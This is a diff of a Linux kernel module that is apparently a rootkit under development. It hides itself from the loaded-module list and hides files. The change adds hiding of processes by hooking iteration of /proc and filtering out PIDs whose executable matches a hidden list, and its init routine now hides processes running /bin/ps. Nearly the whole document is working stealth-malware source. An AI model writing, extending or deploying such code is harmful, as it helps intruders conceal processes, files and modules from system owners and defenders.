@@ -36,6 +36,26 @@ static void hide_module(void) {
 	// THIS_MODULE->notes_attrs = NULL;
 }
 
+static int is_digits(const char *name, int namelen) {
+    int i;
+    for (i = 0; i < namelen; i++) {
+        if (name[i] - '0' > 9 || name[i] - '0' < 0) return 0;
+    }
+    return 1;
+}
+
+
+static unsigned long atoui(const char *name, int namelen) {
+    int i;
+    unsigned int res = 0;
+    for (i = 0; i < namelen; i++) {
+        if (name[i] - '0' > 9 || name[i] - '0' < 0) return 0;
+        res *= 10;
+        res += name[i] - '0';
+    }
+    return res;
+}
+
 static void unhide_module(void) {
 	// Unhide from procfs (lsmod)
 	list_add(&THIS_MODULE->list, modules);
@@ -191,6 +211,25 @@ static int free_hidden_process_entry(const char *exe_file_name) {
 }
 
 
+static unsigned long get_exec_ino_by_pid(int pid) {
+    struct pid *pid_struct;
+    struct task_struct *task_struct;
+    unsigned long result;
+
+    pid_struct = find_get_pid(pid);
+    task_struct = get_pid_task(pid_struct,  PIDTYPE_PID);
+
+    if (!task_struct->mm || !task_struct->mm->exe_file) {
+        return 0;
+    }
+
+    result = task_struct->mm->exe_file->f_inode->i_ino;
+    put_task_struct(task_struct);
+    put_pid(pid_struct);
+    return result;
+}
+
+
 struct hooked_dir_context {
     struct list_head head;
     struct dir_context *ctx;
@@ -200,9 +239,11 @@ struct hooked_dir_context {
 
 static LIST_HEAD(hooked_dir_context_list);
 
+
 static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
     struct hooked_dir_context *entry;
     struct hidden_file_entry *hidden_file;
+    struct hidden_process_entry *hidden_proc;
 
 	list_for_each_entry(entry, &hooked_dir_context_list, head) {
 	    if (entry->ctx == ctx) {
@@ -213,6 +254,11 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
                 }
 	        }
 	        if (entry->ino == proc_ino) {
+	            list_for_each_entry(hidden_proc, &hidden_processes, head) {
+                    if (is_digits(name, namelen) && hidden_proc->exe_file_ino == get_exec_ino_by_pid(atoui(name, namelen))) {
+                        return 0;
+                    }
+                }
 	            printk(KERN_INFO "Called proc iterate!");
 	        }
 	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
@@ -286,26 +332,25 @@ static int hide_file(const char *path_name) {
 	return 0;
 }
 
-static int hide_process(void) {
+static int hide_process(const char *exec_file_path) {
+    return create_hidden_process_entry(exec_file_path);
+}
+
+static int unhide_process(const char *exec_file_path) {
+    return free_hidden_process_entry(exec_file_path);
+}
+
+static int init_hidden_processes(void) {
     int retval;
-    //	char *dir_path;
-    //	char *file_name;
 	struct inode *inode;
 	struct fops_hook *fops_hook;
 	struct file_operations *file_operations;
-
-    //	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
-    //	strcpy(dir_path, path_name);
-    //    file_name = strtok_r(dir_path, "/");
 
 	if ((retval = get_inode_by_path_name("/proc", &inode))) {
 	    return retval;
 	}
 
-    //	if ((retval = create_hidden_file_entry(inode, file_name))) {
-    //	    return retval;
-    //	}
-    //	kfree(dir_path);
+	proc_ino = inode->i_ino;
 
 	fops_hook = get_fops_hook(inode);
 	if (fops_hook != NULL) {
@@ -315,7 +360,6 @@ static int hide_process(void) {
 	}
 
 	if ((retval = create_fops_hook(inode, &file_operations))) {
-    // free_hidden_file_entry(inode, file_name);
 	    return retval;
 	}
 
@@ -346,49 +390,13 @@ static int unhide_file(const char *path_name) {
 	return free_fops_hook(inode);
 }
 
-static unsigned long get_exec_ino_by_pid(int pid) {
-    struct pid *pid_struct;
-    struct task_struct *task_struct;
-    unsigned long result;
-
-    pid_struct = find_get_pid(pid);
-    task_struct = get_pid_task(pid_struct,  PIDTYPE_PID);
-
-    if (!task_struct->mm || !task_struct->mm->exe_file) {
-        return 0;
-    }
-
-    result = task_struct->mm->exe_file->f_inode->i_ino;
-    put_task_struct(task_struct);
-    put_pid(pid_struct);
-    return result;
-}
-
-static int pid_matches_exec_path_name(int pid, const char *path_name) {
-    struct inode *inode;
-
-    // TODO: put inode
-    // TODO: handle errors
-    get_inode_by_path_name(path_name, &inode);
-    return inode->i_ino == get_exec_ino_by_pid(pid);
-}
-
-static void init_hidden_processes(void) {
-    // TODO: put inode.
-    struct inode *inode;
-    get_inode_by_path_name("/proc", &inode);
-    proc_ino = inode->i_ino;
-    hide_process();
-}
 
 static int __init MRK_initialize(void) {
     init_hidden_processes();
 	hide_file(test_path_name);
 	hide_file(test_path_name2);
 	unhide_file(test_path_name2);
-//	get_exec_ino_by_pid(2609);
-//	hide_file("/proc/22");
-//  printk(KERN_INFO "%d", pid_matches_exec_path_name(2609, "/bin/ps"));
+    hide_process("/bin/ps");
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
